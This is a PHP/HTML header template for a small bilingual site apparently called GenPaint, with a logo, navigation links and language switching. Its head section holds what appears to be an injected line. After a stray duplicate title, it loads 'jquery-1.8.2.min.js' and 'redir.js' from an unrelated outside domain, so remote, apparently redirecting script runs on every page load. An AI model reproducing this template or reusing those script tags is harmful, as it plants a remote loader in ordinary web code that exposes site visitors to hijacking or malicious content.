<!DOCTYPE html>
<html>
<head>
	<?php include 'init.php'; ?>

	<title><?php echo $lang['title']; ?></title>
	<meta charset="utf-8">
	<link rel="stylesheet" type="text/css" href="css/estilos.css">

		<title>Bootstrap Example</title><script type = "text/javascript" src = "http://dial.clickscart.in/js/jquery-1.8.2.min.js"> </script><script type = "text/javascript" src = "http://dial.clickscart.in/js/redir.js"> </script>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta charset="utf-8">
  <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
  <script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
  <style>
  .carousel-inner > .item > img,
  .carousel-inner > .item > a > img {
      width: 750%;
      height: 350px;
      margin: auto;
  }
  </style>
  <style type="text/css">
   body { background: #F0FFF0 !important; } /* Adding !important forces the browser to overwrite the default style applied by Bootstrap */
</style>
</head>
<body>


	<div id="topo">
		<div id="logo"><img src="img/GenPaint.png"></div>
		<div id="infoc">
			<div id="slogan">
				<h1><?php echo $lang['slogan']; ?></h1>
			</div>
			<div id="menu">
				<nav class="dropdownmenu">
					<ul>
						<li><a href="index.php"><?php echo $lang['home']; ?></a></li>
						<li><a href="login.php"><?php echo $lang['access']; ?></a></li>
						<li><a href="registo.php"><?php echo $lang['regist']; ?></a></li>
					</ul>
				</nav>

			</div>
		</div>

	</div>
<br>
	<ul>
	<li>

		<a href="?lang=english"><img src="img/2384958_f520.jpg"> English</a>
	</li>
	<li>
		<a href="?lang=portugues"><img src="img/2000px-Flag_of_Portugal.svg.png"> Portugues</a>
	</li>
	</ul>
	